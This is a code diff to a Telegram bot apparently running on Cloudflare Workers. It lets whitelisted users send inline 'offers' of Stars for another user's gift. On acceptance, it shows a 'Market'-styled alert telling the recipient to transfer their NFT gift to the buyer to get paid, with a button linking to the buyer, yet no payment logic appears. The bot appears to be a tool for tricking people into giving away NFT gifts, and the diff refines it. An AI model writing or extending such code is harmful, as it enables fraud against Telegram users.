@@ -30,7 +30,7 @@ export default {
         await callApi("sendMessage", { chat_id: chatId, text: text, parse_mode: "HTML" });
       }
 
-      // --- /add (ДОБАВИТЬ) ---
+      // --- /add ---
       if (update.message && update.message.text.startsWith("/add ")) {
         const senderId = update.message.from.id;
         if (senderId === ADMIN_ID && kv) {
@@ -42,7 +42,7 @@ export default {
               await kv.put(`user:${foundId}`, "true");
               await callApi("sendMessage", { chat_id: ADMIN_ID, text: `✅ Пользователь <b>@${uname}</b> добавлен.`, parse_mode: "HTML" });
             } else {
-              await callApi("sendMessage", { chat_id: ADMIN_ID, text: `⚠️ Попросите <b>@${uname}</b> нажать /start в боте, а затем повторите.`, parse_mode: "HTML" });
+              await callApi("sendMessage", { chat_id: ADMIN_ID, text: `⚠️ Попросите <b>@${uname}</b> нажать /start в боте.`, parse_mode: "HTML" });
             }
           } else {
             await kv.put(`user:${target}`, "true");
@@ -51,32 +51,28 @@ export default {
         }
       }
 
-      // --- /remove (УДАЛИТЬ) ---
+      // --- /remove ---
       if (update.message && update.message.text.startsWith("/remove ")) {
         const senderId = update.message.from.id;
         if (senderId === ADMIN_ID && kv) {
           let target = update.message.text.split(" ")[1].trim();
-          
           if (target.startsWith("@")) {
-            // Удаление по юзернейму
             const uname = target.slice(1).toLowerCase();
             const foundId = await kv.get(`username:${uname}`);
-            
             if (foundId) {
-              await kv.delete(`user:${foundId}`); // Удаляем доступ
-              await callApi("sendMessage", { chat_id: ADMIN_ID, text: `🗑 Пользователь <b>@${uname}</b> удалён из белого списка.`, parse_mode: "HTML" });
+              await kv.delete(`user:${foundId}`);
+              await callApi("sendMessage", { chat_id: ADMIN_ID, text: `🗑 Пользователь <b>@${uname}</b> удалён.`, parse_mode: "HTML" });
             } else {
-              await callApi("sendMessage", { chat_id: ADMIN_ID, text: `⚠️ Пользователь <b>@${uname}</b> не найден в базе.`, parse_mode: "HTML" });
+              await callApi("sendMessage", { chat_id: ADMIN_ID, text: `⚠️ Пользователь <b>@${uname}</b> не найден.`, parse_mode: "HTML" });
             }
           } else {
-            // Удаление по ID
             await kv.delete(`user:${target}`);
-            await callApi("sendMessage", { chat_id: ADMIN_ID, text: `🗑 Пользователь с ID <code>${target}</code> удалён из белого списка.`, parse_mode: "HTML" });
+            await callApi("sendMessage", { chat_id: ADMIN_ID, text: `🗑 Пользователь с ID <code>${target}</code> удалён.`, parse_mode: "HTML" });
           }
         }
       }
 
-      // --- INLINE (Создание офера) ---
+      // --- INLINE ---
       if (update.inline_query) {
         const iq = update.inline_query;
         const userId = iq.from.id;
@@ -94,14 +90,17 @@ export default {
 
           let senderName = iq.from.first_name || "";
           if (iq.from.last_name) senderName += " " + iq.from.last_name;
-          if (!senderName && iq.from.username) senderName = "@" + iq.from.username;
+          if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";
+          
+          // Сохраняем юзернейм для кнопки "Передать"
+          const senderUsername = iq.from.username || ""; 
 
           const offerId = Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
           if (kv) {
-            await kv.put(`offer:${offerId}`, JSON.stringify({ giftLink, amount, senderName }), { expirationTtl: 86400 });
+            await kv.put(`offer:${offerId}`, JSON.stringify({ giftLink, amount, senderName, senderUsername }), { expirationTtl: 86400 });
           }
 
-          const text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ⭐ Stars за этот подарок.\n\nПредложение действительно 5 ч. 59 мин.`;
+          const text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ⭐ Stars за этот подарок.\n\n${giftLink}\n\n⏳ Предложение действительно 5 ч. 59 мин.`;
 
           const results = [{
             type: "article",
@@ -129,53 +128,58 @@ export default {
         const messageId = cq.message.message_id;
         const hasCaption = !!cq.message.caption;
 
-        if (data.startsWith("acc_")) {
-          const offerId = data.replace("acc_", "");
-          let offer = { amount: "⭐", senderName: "покупателя" };
-          
-          if (kv) {
-            const saved = await kv.get(`offer:${offerId}`);
-            if (saved) offer = JSON.parse(saved);
-          }
+        try {
+          if (data.startsWith("acc_")) {
+            const offerId = data.replace("acc_", "");
+            let offer = { amount: "⭐", senderName: "покупателя", senderUsername: "" };
+            
+            if (kv) {
+              const saved = await kv.get(`offer:${offerId}`);
+              if (saved) offer = JSON.parse(saved);
+            }
 
-          await callApi("answerCallbackQuery", { 
-            callback_query_id: cq.id, 
-            text: `Market\nПредложение на продажу успешно принято.\n\nПередайте подарок покупателю, чтобы получить ${offer.amount} ⭐`, 
-            show_alert: true 
-          });
+            // Останавливаем загрузку и показываем Alert
+            await callApi("answerCallbackQuery", { 
+              callback_query_id: cq.id, 
+              text: `Market\nПредложение на продажу успешно принято.\n\nПередайте подарок покупателю, чтобы получить ${offer.amount} ⭐`, 
+              show_alert: true 
+            });
 
-          const newMarkup = { 
-            inline_keyboard: [
-              [{ text: "Передать NFT ↗", url: `https://t.me/${offer.senderName.replace("@", "")}` }]
-            ] 
-          };
-          const newText = `✓ <b>Предложение успешно принято.</b>\n\nПередайте подарок покупателю, чтобы получить ${offer.amount} ⭐.`;
+            // Безопасная ссылка на покупателя
+            let btnUrl = "https://t.me/";
+            if (offer.senderUsername) {
+               btnUrl += offer.senderUsername;
+            }
 
-          try {
+            const newMarkup = { inline_keyboard: [[{ text: "Передать NFT ↗", url: btnUrl }]] };
+            const newText = `✓ <b>Предложение успешно принято.</b>\n\nПередайте подарок покупателю, чтобы получить ${offer.amount} ⭐.`;
+
             if (hasCaption) {
               await callApi("editMessageCaption", { chat_id: chatId, message_id: messageId, caption: newText, parse_mode: "HTML", reply_markup: newMarkup });
             } else {
               await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: newMarkup });
             }
-          } catch (e) {
-            console.error("Ошибка при редактировании:", e.message);
-          }
-        } 
-        else if (data.startsWith("dec_")) {
-          await callApi("answerCallbackQuery", { callback_query_id: cq.id });
+          } 
+          else if (data.startsWith("dec_")) {
+            await callApi("answerCallbackQuery", { callback_query_id: cq.id });
 
-          const newText = `× Оффер отклонён.`;
-          const emptyMarkup = { inline_keyboard: [] };
+            const newText = `× Оффер отклонён.`;
+            const emptyMarkup = { inline_keyboard: [] };
 
-          try {
             if (hasCaption) {
               await callApi("editMessageCaption", { chat_id: chatId, message_id: messageId, caption: newText, parse_mode: "HTML", reply_markup: emptyMarkup });
             } else {
               await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: emptyMarkup });
             }
-          } catch (e) {
-            console.error("Ошибка при редактировании:", e.message);
           }
+        } catch (err) {
+          // Если внутри кнопки произошла ошибка, мы выводим ее прямо в Telegram, чтобы ты видел причину!
+          console.error("Ошибка кнопки:", err.message);
+          await callApi("answerCallbackQuery", { 
+            callback_query_id: cq.id, 
+            text: "Ошибка: " + err.message, 
+            show_alert: true 
+          }).catch(e => console.error(e));
         }
       }
 
@@ -187,12 +191,22 @@ export default {
   }
 };
 
+// Функция теперь логирует ошибки Telegram в консоль Cloudflare
 async function callApi(method, body) {
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
-  const response = await fetch(url, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(body)
-  });
-  return response.json();
+  try {
+    const response = await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(body)
+    });
+    const data = await response.json();
+    if (!data.ok) {
+      console.error(`Telegram API Error [${method}]:`, JSON.stringify(data));
+    }
+    return data;
+  } catch (e) {
+    console.error(`Fetch Error [${method}]:`, e.message);
+    throw e;
+  }
 }
